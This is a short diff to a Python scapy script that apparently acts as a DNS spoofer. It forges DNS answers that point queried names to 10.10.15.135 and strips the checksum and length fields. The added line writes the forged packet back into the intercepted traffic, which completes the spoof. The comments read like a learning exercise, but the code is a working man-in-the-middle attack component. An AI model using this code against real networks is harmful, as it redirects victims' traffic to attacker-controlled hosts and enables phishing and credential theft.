@@ -29,7 +29,7 @@ def process_packet(packet):
 
             answer = scapy.DNSRR(rrname=qname, rdata='10.10.15.135')  # creates a DNSRR response to be send to the
             # target machine
-            scapy_packet[scapy.DNS].an = answer  # links the forged package to the captured data
+            scapy_packet[scapy.DNS].an = answer  # sets payload to forged package
             scapy_packet[scapy.DNS].ancount = 1  # check pcks sent and match num with correct value
 
             # deletes the fields chksum and len outta each layer, scapy will recalculate them
@@ -38,6 +38,8 @@ def process_packet(packet):
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
+
+            packet.set_payload(str(scapy_packet))  # modifies original package with forged one
 
         # print(scapy_packet.show())
 
